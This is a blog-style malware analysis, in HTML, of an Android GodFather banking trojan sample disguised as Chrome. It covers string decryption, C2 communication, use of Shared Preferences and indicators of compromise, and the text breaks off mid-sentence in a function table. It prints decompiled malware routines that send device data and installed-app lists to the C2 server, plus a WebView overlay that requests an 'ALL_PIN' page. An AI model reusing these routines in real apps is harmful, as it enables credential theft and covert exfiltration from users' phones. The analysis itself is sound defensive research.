<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->

<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>GodFather Android Malware Analysis - Ph3mt Blog</title>
<meta name="description" content="GodFather is an Android malware that was first identified in mid 2023 and quickly attracted the attention of security experts because of its advanced capabilities and modular structure. Its design highlights a significant evolution from its predecessors, exploiting sophisticated techniques to circumvent security measures and infect Android devices.  In this article, we will explore how this version of the malware communicates with the C2 server, a critical component that allows attackers to manage the malware in real time and receive stolen data. We will also analyze GodFather’s use of Shared Preferences to store important data locally on the infected device, making it more difficult to detect and delete the collected information.  APK Overview  Looking for the SHA-256 of the apk on VirusTotal, we immediately notice that it is already reported as malicious by several security vendors.    The application bundle contains several files, the app.xml file contained in the shared_prefs looks interesting (it will be explained later).    The domain (which will be explained later in the article) also turns out to be malicious.    New Version of GodFather  The first thing one notices upon examining the apk is the absence of an anti-emulator check unlike the samples analyzed by muha2xmad and group-ib.  Step1 : Encrypted strings  The strings in the application appear to be encrypted, in fact in the following image you can see some of the encrypted strings used by the malware.    The class that deals with decrypt these strings is effluvias.  ![Figure 5 - Effluvias Class](/assets/images/2024-12-09-godfather-android-analysis/img5.png  This function decrypts a base64 text using the AES algorithm in CBC mode with PKCS5 padding.  Using JAVA, it is possible to reproduce the reverse mechanism to decipher the strings in the apk. Below is the code used to decipher the strings.  import java.util.Base64; import java.util.Arrays; import javax.crypto.Cipher; import javax.crypto.spec.IvParameterSpec; import javax.crypto.spec.SecretKeySpec; import java.nio.charset.StandardCharsets;   public class DecryptionExample {          public static void main(String[] args) {         // Check args         if (args.length == 0) {             System.out.println(&quot;Inserisci il testo cifrato.&quot;);             System.exit(1);         }           String encryptedText = args[0];           String decryptedText = effluvias(encryptedText);                  if (decryptedText != null) {             System.out.println(&quot;Decrypted text: &quot; + decryptedText);         } else {             System.out.println(&quot;Failed to decrypt text&quot;);         }     }       public static String effluvias(String ciphertext) {         try {             byte[] cipherbytes = Base64.getDecoder().decode(ciphertext);             byte[] initVector = Arrays.copyOfRange(cipherbytes, 0, 16);             byte[] messagebytes = Arrays.copyOfRange(cipherbytes, 16, cipherbytes.length);             IvParameterSpec iv = new IvParameterSpec(initVector);             SecretKeySpec skeySpec = new SecretKeySpec(&quot;B9M80O2RAK1VRJNV&quot;.getBytes(StandardCharsets.UTF_8), &quot;AES&quot;);             Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);             cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);             byte[] byte_array = cipher.doFinal(messagebytes);             return new String(byte_array, StandardCharsets.UTF_8);         } catch (Exception ex) {             ex.printStackTrace();             return null;         }     } }   With the script it was possible create a full list of Encrypted and Decrypted String, https://github.com/phemt91/GodFather_String.git  Step2 : C2 Communication  Having installed the apk in the emulator, it was possible to start observing its behavior. Regarding network calls, we can see an attempt to connect to the first  in the image below:    Examining the code we find references to it:    Using the script to decipher the strings in fact we find that:  o7lGWUU/28+5RpweyMuUGihsbHNkfHAHwgyycKpQfBmF6MkVSa58Dvr6WU6eFxLJ:https://t[.]me/famokorapisoram     The string also appears to be encrypted, plus we find that this particular string is also present in the Shared Preference:  &lt;string name=&quot;min&quot;&gt;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&lt;/string&gt;   Continuing the analysis we find that:    Contextualizing them:  Hagiography  The function takes a Base64-encoded string, decodes it into a byte array, assigns the decoded byte array to a global variable called cremosin, and returns the decoded string.      public static String hagiography(String c) {         cremosin = new byte[0];         byte[] decode = Base64.decode(c.getBytes(StandardCharsets.UTF_8), 0);         cremosin = decode;         return new String(decode);     }   Uriiah  The function is designed to encrypt a string s using a symmetric encryption algorithm (presumably Blowfish) with a secret key set “ABC”  public static String Uriiah(String s) {         String effluvias = (&quot;Blowfish&quot;);         try {             return samariums(s, new SecretKeySpec((&quot;ABC&quot;).getBytes(), effluvias), Cipher.getInstance(effluvias));         } catch (Exception e) {             return HttpUrl.FRAGMENT_ENCODE_SET;         }     }   Samariums This function takes a Base64-encoded string, decrypt it using a symmetric encryption algorithm with a secret key and a specific IV, returning the decrypted string.  public static String samariums(String s, SecretKeySpec sec, Cipher c) throws InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {         try {             byte[] val = Base64.decode(s, 0);             c.init(2, sec, new IvParameterSpec((&quot;abcdefgh&quot;).getBytes()));             return new String(c.doFinal(val));         } catch (Exception e) {             return HttpUrl.FRAGMENT_ENCODE_SET;         }     }   Starting with this information, it was possible to create a script that would allow us to decipher the string:  import javax.crypto.Cipher; import javax.crypto.spec.IvParameterSpec; import javax.crypto.spec.SecretKeySpec; import java.nio.charset.StandardCharsets; import java.util.Base64;   public class DecryptionScript {       public static void main(String[] args) {         String encryptedString = &quot;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&quot;;         String decryptedString = decrypt(encryptedString);         System.out.println(&quot;Decrypted String: &quot; + decryptedString);     }       public static String decrypt(String encryptedString) {         try {             String decrypted = Uriiah(encryptedString);             return decrypted;         } catch (Exception e) {             e.printStackTrace();             return null;         }     }       public static String Uriiah(String s) {         String effluvias = AnnotationHttp.effluvias(&quot;Blowfish&quot;);         try {             return samariums(s, new SecretKeySpec(AnnotationHttp.effluvias(&quot;ABC&quot;).getBytes(), effluvias), Cipher.getInstance(effluvias));         } catch (Exception e) {             e.printStackTrace();             return null;         }     }   public static String samariums(String s, SecretKeySpec sec, Cipher c) throws Exception {     byte[] val = Base64.getDecoder().decode(s);     c.init(Cipher.DECRYPT_MODE, sec);     return new String(c.doFinal(val), StandardCharsets.UTF_8); }       // Dummy class for AnnotationHttp     static class AnnotationHttp {         public static String effluvias(String s) {             // Dummy implementation             return s;         }     } }   It returns the following url:  https://yukoramparata[.]top/zamra/aaa/    Analyzing the endpoint on VirusTotal it was found to be malicious:    Step3 : Shared Preference and Talking with C2  When the application starts, a file called app.xml is created inside the shared preferences, containing several pieces of information:    &lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39; standalone=&#39;yes&#39; ?&gt;   &lt;map&gt;       &lt;string name=&quot;acb&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;aox&quot;&gt;UGxheSBTdG9yZQ&lt;/string&gt;      &lt;string name=&quot;sy2&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;notification&quot;&gt;UGxlYXNlIGdyYW50IGFjY2Vzc2liaWxpdHkgcGVybWlzc2lvbiB0byB1c2UgdGhlIGFwcGxpY2F0aW9uLg&lt;/string&gt;      &lt;string name=&quot;btck&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;onb2&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;tag&quot;&gt;MDQwMUVO&lt;/string&gt;      &lt;string name=&quot;giflink&quot;&gt;aHR0cHM6Ly9zNS5naWZ5dS5jb20vaW1hZ2VzL1M4QWg2LmdpZg&lt;/string&gt;      &lt;string name=&quot;opc&quot;&gt;0&lt;/string&gt;      &lt;string name=&quot;messagex&quot;&gt;QSBuZXcgdmVyc2lvbiBvZiBvdXIgYXBwbGljYXRpb24gaXMgYXZhaWxhYmxlLiBUbyB1cGRhdGUsIGdvIHRvIFBsYXkgU3RvcmUu&lt;/string&gt;      &lt;string name=&quot;oph&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;cdm2&quot;&gt;reee&lt;/string&gt;      &lt;string name=&quot;alt&quot;&gt;com.melting.mantaught|||&lt;/string&gt;      &lt;string name=&quot;opi&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;ull1&quot;&gt;Rm9yY2Ugc3RvcA&lt;/string&gt;      &lt;string name=&quot;ull2&quot;&gt;dG8gcmVtb3Zl&lt;/string&gt;      &lt;string name=&quot;lowbattery&quot;&gt;TG93IEJhdHRlcnk&lt;/string&gt;      &lt;string name=&quot;xau&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;cdm&quot;&gt;reee&lt;/string&gt;      &lt;string name=&quot;opo&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;toast&quot;&gt;UGxlYXNlIGdyYW50IGFjY2Vzc2liaWxpdHkgcGVybWlzc2lvbiBmb3IgdGhlIGFwcGxpY2F0aW9uIHRvIHJ1bi4&lt;/string&gt;      &lt;string name=&quot;dsd&quot;&gt;none&lt;/string&gt;      &lt;string name=&quot;boa&quot;&gt;QWxsb3c&lt;/string&gt;      &lt;string name=&quot;btry&quot;&gt;0&lt;/string&gt;      &lt;string name=&quot;device&quot;&gt;2&lt;/string&gt;      &lt;string name=&quot;accs&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;psd&quot;&gt;falsefalse&lt;/string&gt;      &lt;string name=&quot;allow&quot;&gt;QWxsb3c&lt;/string&gt;      &lt;string name=&quot;rbt&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;fss&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;aduration&quot;&gt;1500&lt;/string&gt;      &lt;string name=&quot;locale&quot;&gt;en&lt;/string&gt;      &lt;string name=&quot;sb&quot;&gt;0&lt;/string&gt;      &lt;string name=&quot;duration&quot;&gt;500&lt;/string&gt;      &lt;string name=&quot;titlex&quot;&gt;SW5mb3JtYXRpb24&lt;/string&gt;      &lt;string name=&quot;bs&quot;&gt;0&lt;/string&gt;     &lt;string name=&quot;smm&quot;&gt;13 A50&lt;/string&gt;      &lt;string name=&quot;forwading&quot;&gt;Y29tLmxtci5sZm0&lt;/string&gt;      &lt;string name=&quot;min&quot;&gt;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&lt;/string&gt;      &lt;string name=&quot;ka&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;logsender&quot;&gt;0&lt;/string&gt;      &lt;string name=&quot;onb&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;restart&quot;&gt;cmVzdGFydA&lt;/string&gt;      &lt;string name=&quot;ullh&quot;&gt;Rk9SQ0UgU1RPUA&lt;/string&gt;      &lt;string name=&quot;sy&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;infobig&quot;&gt;UGxlYXNlIGdyYW50IHRoZSBwZXJtaXNzaW9uIHNob3duIGFib3ZlIGZvciB0aGUgYXBwbGljYXRpb24gdG8gcnVuLg&lt;/string&gt;      &lt;string name=&quot;again&quot;&gt;UGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4&lt;/string&gt;      &lt;string name=&quot;ntr&quot;&gt;true&lt;/string&gt;      &lt;string name=&quot;ullp&quot;&gt;Rm9yY2Ugc3RvcA&lt;/string&gt;      &lt;string name=&quot;ky&quot;&gt;0hh2fpkr5zt72&lt;/string&gt;      &lt;string name=&quot;permistoast&quot;&gt;WW91IGNhbm5vdCB1c2UgdGhlIGFwcGxpY2F0aW9uIHdpdGhvdXQgZ2l2aW5nIHRoZSBuZWNlc3NhcnkgcGVybWlzc2lvbi4&lt;/string&gt;      &lt;string name=&quot;aso&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;pl&quot;&gt;0&lt;/string&gt;   &lt;/map&gt;    Analyzing the wide variety of data, a question was asked: What are these strings? What are they used for?  The main functions involved in reading and writing Shared Preference are Bedamend and Sandrakottos:  Bedamned    The function retrives data from SharedPreference:  Opens the sharedpreference called “app” (app.xml) and return the string associated with key n from the SharedPreferences.  If the key does not exist, it returns a default value.      public static String bedamned(Context context, String n) {          SharedPreferences s = context.getSharedPreferences((&quot;app&quot;);          return s.getString(n, HttpUrl.FRAGMENT_ENCODE_SET);      }      Sandrakottos    The function writes data to shared preference, inserts the key-value paur (n,p) into the SharedPreferences        public static void Sandrakottos(Context context, String n, String p) {           SharedPreferences s = context.getSharedPreferences((&quot;app&quot;), 0);           SharedPreferences.Editor e = s.edit();           e.putString(n, p);           e.apply();       }    Having found the function that read and write the share preferences, it was possibile to proceed to the examination of the main functions that write and read data from the shared Preferences:  Champaka    The function generates a random string, which will then be used as the identifier of the device on which the malware is installed, to communicate with the c2 (we will see in the appropriate section). The function take the length of the string “a” as parameter. The created string will contain numbers from 0 to 9 and lowercase letters from a to z without w and x.      public static String champaka(int l) {         String a = (&quot;0123456789&quot;)+(&quot;abcdefghijklmpqrstuvyz&quot;).toLowerCase();         StringBuilder s = new StringBuilder(l);         for (int i = 0; i &lt; l; i++) {             int in = (int) (a.length() * Math.random());             s.append(a.charAt(in));         }         return s.toString();     }    Undissuadably    It Initializes an OkHttpClient  object with different timeouts, constructs a FormBody using the parameters provided in the HashMap. Creates and sends HTTP POST request with the parameters. If the response is valid and contains the string “Injection”,it  processes the response further, splits the result and invokes several functions, some of which appears to store values in SharedPreferences. Then it stores the result in the “obtainal” key.   public static String undissuadably(final Context context, String url, HashMap&lt;String, String&gt; params) {     try {         fiddlebow = new OkHttpClient();         OkHttpClient.Builder builder = new OkHttpClient.Builder();         TimeUnit timeUnit = TimeUnit.SECONDS;         fiddlebow = builder             .connectTimeout(50L, timeUnit)             .writeTimeout(50L, timeUnit)             .readTimeout(50L, timeUnit)             .callTimeout(50L, timeUnit)             .build();                  final FormBody.Builder builder2 = new FormBody.Builder();         nonstylized = builder2;         Objects.requireNonNull(builder2);                  params.forEach(new BiConsumer&lt;String, String&gt;() {             @Override             public void accept(String key, String value) {                 builder2.add(key, value);             }         });                  spekboom = nonstylized.build();                  Request build = new Request.Builder()             .addHeader(&quot;Content-Type&quot;, &quot;text/plain; charset=utf-8&quot;)             .addHeader(&quot;Connection&quot;, &quot;close&quot;)             .url(url)             .post(spekboom)             .build();                  Custer = build;                  fiddlebow.newCall(build).enqueue(new Callback() {             @Override             public void onFailure(Call call, IOException e) {             }               @Override             public void onResponse(Call call, Response response) throws IOException {                 String effluvias = &quot;cn&quot;;                 if (response.isSuccessful()) {                     try {                         String res = response.body().string();                         veepees.obtainal = res;                         try {                             if (!res.isEmpty()) {                                 veepees.obtainal = Tamarix.Uriiah(res);                             }                         } catch (Exception e) {                         }                         if (!Tamarix.bedamned(context, effluvias).contains(veepees.obtainal)) {                             if (veepees.obtainal.contains(&quot;Injection&quot;)) {                                 String[] split = veepees.obtainal.trim().split(&quot;:&quot;);                                 veepees.tautologys = split;                                 try {                                     rawedged.runtiest(context, split[8]);                                 } catch (Exception e2) {                                 }                                 try {                                     rawedged.reexpressing(context, veepees.tautologys[11]);                                 } catch (Exception e3) {                                 }                                 try {                                     Tamarix.Sandrakottos(context, &quot;dsd&quot;, veepees.tautologys[13]);                                 } catch (Exception e4) {                                 }                                 try {                                     Context context2 = context;                                     String[] strArr = veepees.tautologys;                                     rawedged.hyperemetic(context2, strArr[14], strArr[15]);                                 } catch (Exception e5) {                                 }                                 try {                                     Tamarix.Sandrakottos(context, &quot;psd&quot;, veepees.tautologys[22]);                                 } catch (Exception e6) {                                 }                                 try {                                     Besant.sublibrarianship(context, veepees.tautologys[21]);                                 } catch (Exception e7) {                                                                }                                 Tamarix.Sandrakottos(context, &quot;is&quot;, veepees.tautologys[1]);                             }                             Tamarix.Sandrakottos(context, effluvias, res);                         }                     } catch (Exception e8) {                                       }                 }             }         });         return HttpUrl.FRAGMENT_ENCODE_SET;     } catch (Exception e) {         return HttpUrl.FRAGMENT_ENCODE_SET;     } }     Spellican    This function creates an OkHttpClient.Builder.  It configures the timeouts for connect, write, read, and total call to 50 seconds each. Convert the response body to a string using a regex to search for a specific meta tag with property=”og:description” and capture the contents of the tag. For each occurrence found by the regex, call the Sandrakottos method to save the content in the SharedPreferences under the key “min”.    Which, in fact, turns out to be the C2 string analyzed earlier.   public static void spellican(String url, Context context) throws IOException {         OkHttpClient.Builder builder = new OkHttpClient.Builder();         TimeUnit timeUnit = TimeUnit.SECONDS;         OkHttpClient client = builder.connectTimeout(50L, timeUnit).writeTimeout(50L, timeUnit).readTimeout(50L, timeUnit).callTimeout(50L, timeUnit).build();         Request request = new Request.Builder().url(url).addHeader((&quot;User-Agent&quot;), (&quot;Mozilla/5.0 (Linux; Android 10; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36&quot;)).build();         try {             Response response = client.newCall(request).execute();             if (!response.isSuccessful()) {                 throw new IOException((&quot;Unexpected code&quot;) + response);             }             String tele = response.body().string();             Pattern pattern = Pattern.compile((&#39;&lt;meta property=\&quot;og:description\&quot; content=\&quot;(.*?)\&quot;&gt;&#39;), 32);             Matcher matcher = pattern.matcher(tele);             while (matcher.find()) {                 Sandrakottos(context, (&quot;min&quot;), matcher.group(1));             }             response.close();         } catch (IOException e) {             e.printStackTrace();         }     }     Rarefeatured    This function prepares and sends an http request. This function is confusing because it uses two variables called effluvias and effluvias2 with values “alt” and “ky” respectively, ( Effluvias is the same name as the function that is used to decipher strings).  A URL is constructed by concatenating the result of the Uriiah method applied to the result of the bedamned method with the key “min” and the string “callnew.php”. On the Shared Preference we can see   &lt;string name=&quot;min&quot;&gt;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&lt;/string&gt;  Deciphered with Uriiah function give us: https://yukoramparata.top/zamra/aaa/ , adding the string “callnew.php”:  https://yukoramparata[.]top/zamra/aaa/callnew[.]php  The rarefeatured function appears to prepare and send an HTTP POST request including a set of data retrieved from the SharedPreference       public static void rarefeatured(Context context, String e) {     public static void rarefeatured(Context context, String e) {         String effluvias = (&quot;alt&quot;);         String effluvias2 = (&quot;ky&quot;);         try {             HashMap&lt;String, String&gt; p = new HashMap&lt;&gt;();             p.put(effluvias2, bedamned(context, effluvias2));             p.put((&quot;tg&quot;), hagiography(bedamned(context, (&quot;tag&quot;))));             p.put((&quot;cy&quot;), bedamned(context, (&quot;locale&quot;)));             p.put((&quot;model&quot;), bedamned(context, (&quot;smm&quot;)));             p.put((&quot;nw&quot;), (&quot;true&quot;));             p.put(effluvias, bedamned(context, effluvias));             p.put((&quot;eys&quot;), e);             p.put((&quot;rpn&quot;), bedamned(context, (&quot;psv&quot;)));             veepees.undissuadably(context, Uriiah(bedamned(context, (&quot;min&quot;))) + (&quot;callnew.php&quot;), p);         } catch (Exception e2) {         }     }                  alt       com.melting.mantaught                 tg       0401EN                 cy       en                 model       13 A50                 nw       true                 ky       0hh2fpkr5zt72           Checking the requests from our device proxy:    Step4 : Retrieve Shared Preference and Talking with C2  The data it sends is all data that this malware retrieves in different ways, specifically:  JJ    The JJ function collects device information (manufacturer and model) and sends a specific code associated with these details using a call to Tamarix. Sandrakottos.  This could be used to keep track of the type of device that is using the app or to send specific information to the app server for device management or profiling. Ex. Using an emulator for analysis is returned the value device 2     public static void JJ(Context context) {     String r;     String d = Build.MANUFACTURER + Build.MODEL;       if (d.contains(&quot;HUAWEI&quot;)) {         r = &quot;0&quot;;     } else if (d.contains(&quot;Pixel&quot;)) {         r = &quot;1&quot;;     } else if (d.substring(0, 2).contains(&quot;LG&quot;)) {         r = &quot;3&quot;;     } else if (d.contains(&quot;Xiaomi&quot;)) {         r = &quot;5&quot;;     } else if (d.contains(&quot;OPPO&quot;) || d.contains(&quot;CPH&quot;)) {         r = &quot;4&quot;;     } else {         r = &quot;2&quot;;     }       Tamarix.Sandrakottos(context, &quot;device&quot;, r);    Untraffickable    It checks if the device is of a certain type (device equals “4”) via the Tamarix.bedamned. If true, it sets a value of “true” in the context with the key “opi”. Gets the intent and retrieve two values (str and id) passed through the intent.  If str is not null or empty, it sets a value “true” in the context with the key “rbt”. Configure a WebView with JavaScript enabled and a specific User-Agent. Extends WebViewClient and handles web page loading events.  The method onPagefinished: if the URL contains “STOP”, it performs a series of actions: •   Loads a blank page (About:blank) •   Updates some keys in the context with new values. •   Finish the activity. (finish) •   Extends webChromeClient •   Handles JavaScript Alert (onJsAlert) Otherwise, it checks the device type again and updates the keys in the context with “false” value.  This function returns false when the “back” button is pressed   public class untraffickable extends Activity {     private static String prevailed;       @Override     @SuppressLint({&quot;SetJavaScriptEnabled&quot;})     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);     }       @Override     public void onStart() {         super.onStart();         boolean equals = Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias(&quot;device&quot;)).equals(cirrofilum.effluvias(&quot;4&quot;));         String effluvias = cirrofilum.effluvias(&quot;true&quot;);         if (equals) {             Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;opi&quot;), effluvias);         }         Intent intent = getIntent();         String str = intent.getStringExtra(cirrofilum.effluvias(&quot;str&quot;));         prevailed = intent.getStringExtra(cirrofilum.effluvias(&quot;id&quot;));         if (!str.equals(HttpUrl.FRAGMENT_ENCODE_SET) || str != null) {             Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;rbt&quot;), effluvias);             WebView wv = new WebView(this);             wv.getSettings().setJavaScriptEnabled(true);             wv.getSettings().setUserAgentString(cirrofilum.effluvias(&quot;Mozilla/5.0 (Linux; Android 9; SM-J730F Build/PPR12.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36&quot;));             wv.setWebViewClient(new MyWebViewClient());             wv.setWebChromeClient(new MyWebChromeClient());             wv.loadUrl(Tamarix.Uriiah(Tamarix.bedamned(this, cirrofilum.effluvias(&quot;min&quot;))) + cirrofilum.effluvias(&quot;rx/f.php?f=&quot;) + str + cirrofilum.effluvias(&quot;&amp;p=&quot;) + Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias(&quot;ky&quot;)) + cirrofilum.effluvias(&quot;|&quot;) + Locale.getDefault().getLanguage().toLowerCase());             setContentView(wv);         }     }       public class MyWebViewClient extends WebViewClient {         @Override         public void onPageFinished(WebView view, String url) {             if (url.contains(cirrofilum.effluvias(&quot;STOP&quot;))) {                 view.loadUrl(cirrofilum.effluvias(&quot;about:blank&quot;));                 Context applicationContext = untraffickable.this.getApplicationContext();                 String effluvias = cirrofilum.effluvias(&quot;is&quot;);                 String rep = Tamarix.bedamned(applicationContext, effluvias);                 Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), effluvias, rep.replace(untraffickable.prevailed, HttpUrl.FRAGMENT_ENCODE_SET));                 Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias(&quot;opo&quot;), cirrofilum.effluvias(&quot;true&quot;));                 Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias(&quot;psv&quot;), cirrofilum.effluvias(&quot;0&quot;));                 Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias(&quot;rbt&quot;), cirrofilum.effluvias(&quot;false&quot;));                 untraffickable.this.finish();             }         }           @Override         public boolean shouldOverrideUrlLoading(WebView view, String url) {             return false;         }     }       public class MyWebChromeClient extends WebChromeClient {         @Override         public boolean onJsAlert(WebView view, String url, String message, JsResult result) {             return true;         }     }       @Override     public void onStop() {         super.onStop();         boolean equals = Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias(&quot;device&quot;)).equals(cirrofilum.effluvias(&quot;4&quot;));         String effluvias = cirrofilum.effluvias(&quot;false&quot;);         if (equals) {             Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;opi&quot;), effluvias);         }         Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;rbt&quot;), effluvias);     }       @Override     public void onDestroy() {         super.onDestroy();     }       @Override     public boolean onKeyDown(int keyCode, KeyEvent event) {         return false;     }       @Override     public void onBackPressed() {         super.onBackPressed();     } }    Analyzing the “construction” of the url will be: Within the method wv.loadrl:   wv.loadUrl(     Tamarix.Uriiah(Tamarix.bedamned(this, &quot;min&quot;)) +      &quot;rx/f.php?f=&quot; + str +      &quot;&amp;p=&quot; + Tamarix.bedamned(getApplicationContext(), &quot;ky&quot;) +      &quot;|&quot; + Locale.getDefault().getLanguage().toLowerCase() );    Tamarix.Uriiah(Tamarix.bedamned(this, “min”)): Uriiah method takes a value obtained from Tamarix.bedamned(this, “min”) and returns a fixed part of the URL. So https://yukoramparata.top/zamra/aaa/ “rx/f.php?f=” + str: adds the parameters “f” with the value obtained from the intent (str). “&amp;p=” + Tamarix.bedamned(getApplicationContext(), “ky”): adds the parameter “p” with a value obtained from  Tamarix.bedamned.  ”|” + Locale.getDefault().getLanguage().toLowerCase(): Adds the device language as a parameter in the URL. The parameters str and id could be generated by speculatd function (in detalis below). Below the code of the speculated function                           Intent dialogIntent = new Intent(ctx, untraffickable.class)                             .putExtra(&quot;str&quot;, &quot;ALL_PIN&quot;)                             .putExtra(&quot;id&quot;, &quot;1500&quot;);      The result: https://yukoramparata.top/zamra/aaa/rx/f.php?f=ALL_PIN&amp;p=0hh2fpkr5zt72|en  Speculated    The function gets an instance of KeyguardManager, it checks whether the device is locked using the isKeyguardLocked()  If the device is not locked (locked is false), the function creates a Timer object.  It defines an anonymous TimerTask that performs a periodic task   public static void speculated(final Context ctx) {     KeyguardManager km = (KeyguardManager) ctx.getSystemService(&quot;keyguard&quot;);     boolean locked = km.isKeyguardLocked();     if (!locked) {         try {             final Timer timerObj = new Timer();             TimerTask timerTask = new TimerTask() {                 @Override                 public void run() {                     if (Tamarix.bedamned(ctx, &quot;opi&quot;).contains(&quot;false&quot;)) {                         String bedamned = Tamarix.bedamned(ctx, &quot;opo&quot;);                         String effluvias = &quot;true&quot;;                         if (bedamned.contains(effluvias)) {                             Besant.mismoving.cancel();                             timerObj.cancel();                             Tamarix.Sandrakottos(ctx, &quot;oph&quot;, effluvias);                             return;                         }                         Intent dialogIntent = new Intent(ctx, untraffickable.class)                             .putExtra(&quot;str&quot;, &quot;ALL_PIN&quot;)                             .putExtra(&quot;id&quot;, &quot;1500&quot;);                         dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                         dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);                         dialogIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);                         ctx.startActivity(dialogIntent);                     }                 }             };             mismoving = timerTask;             timerObj.schedule(timerTask, 0L, 2000L);         } catch (Exception e) {         }     } }      Osnabruck    In this function a “bowfin” string is initialized with the value, representing an empty string or URL escape character. A loop is run through the list of installed applications obtained through the PackageManager. For each PackageInfo in the list:    If the Flag_System flag of the application is disable (indicating that the application is non-system),   the application package name is added to the bowfin string, followed by |||. At the end, the bowfin string is passed to the Sandrakottos function.       public static String Osnabruck(Context context) {         bowfin = HttpUrl.FRAGMENT_ENCODE_SET;         try {             List&lt;PackageInfo&gt; b = context.getPackageManager().getInstalledPackages(0);             for (int i = 0; i &lt; b.size(); i++) {                 PackageInfo p = b.get(i);                 ApplicationInfo applicationInfo = p.applicationInfo;                 if ((applicationInfo.flags &amp; 1) == 0) {                     String a = applicationInfo.packageName;                     bowfin += a + (&quot;|||&quot;);                 }             }             Tamarix.Sandrakottos(context, (&quot;alt&quot;), bowfin);         } catch (Exception e) {         }         return bowfin;     }     Tamarix.Sandrakottos(context, (“alt”), bowfin);  In the shared preference we can see:    That is because we use a New Emulator with no application installed.  Malacostraca    This function retrieves the value associated with the key “ky” from the SharedPreference.  It Inserts an addition parameter with key “ick” and value “true” into the params map,  retrieves the value associated with key “min” from the shared preferences using the bedamned method.  After that it passes the retrived value to the Uriiah function to obtain the base URL.  Adds “call.php” to the obtained base url.  Call undissuadably method to perform an HTTP POST request to this URL with the params.     public static void Malacostraca(Context context) {     String effluvias = &quot;ky&quot;;     try {         HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;();                  params.put(effluvias, bedamned(context, effluvias));                  params.put(&quot;ick&quot;, &quot;true&quot;);                  String url = Uriiah(bedamned(context, &quot;min&quot;)) + &quot;callnew.php&quot;;                  veepees.undissuadably(context, url, params);     } catch (Exception e) {     } }    Conclusion  Analysis of some of GodFather’s features provided insight into its capabilities and operation. Here are the key points that emerged from our analysis:  •   C2 communication: GodFather uses encrypted communication with the command-and-control server to send stolen data and receive commands. This two-way channel allows attackers to manage the infection in real time, updating the malware with new instructions or exfiltrating additional data without raising suspicion.  •   Using Shared Preferences: The malware exploits Android’s Shared Preferences to store critical information, such as login details or temporary keys. This technique allows GodFather to retain data even after a device reboot, maintaining persistence and making it easier to retrieve the information for later use.  Indicator of Compromise                 App Name       Chrome.apk                 Package Name       com.melting.mantaught                 Sha256       20116083565a50f6b2db59011e9994e9a9f5db5994703d53233b8b202a5ad2f3                 Telegram Channel       https://t.me/famokorapisoram                 C2 Server       https://yukoramparata.top/zamra/aaa/           List of quick reference of function                 Function Name       Description                       cirrofilum.effluvias       Decipher Strings                 Sandrakottos       Write data inside the SharedPreference                 bedamned       Retrive data from SharedPreference                 champaka       Generate random string                 undissuadably       Use OkHttp to mke a request and then process the http response and save it in the sharepreference                 hagiography       Decode a string into Base64                 Uriiah       Deciphering with blowfish, SecretKeySpec “ABC”                 samariums       Takes a string in b64 and decoding it with an algorithm                 hexammine       Send data to a remote server                 rarefeatured       Prepares to send a request http                 gnarliness       Takes a string in input, converts it to a byte array using UTF-8 encoding and then econdes the byte array in Base64, return the string as result                 trochanteric       Converts an array of bytes into a hexadecimal string                 crakow       Ensure that the lenght of string “s” is a multiple of 16 by adding null characters to the end of the string if necessary                 Predicator       Function where an IV (sulphuric) is initialized using a fixed sequence of hexadecimal characters (“fedcba9876543210”). A secret key (potlatching) is created for the AES algorighm using a fix sequence of hexadecimal characters (“0123456789abcdef”).                 Spellican       Executes an 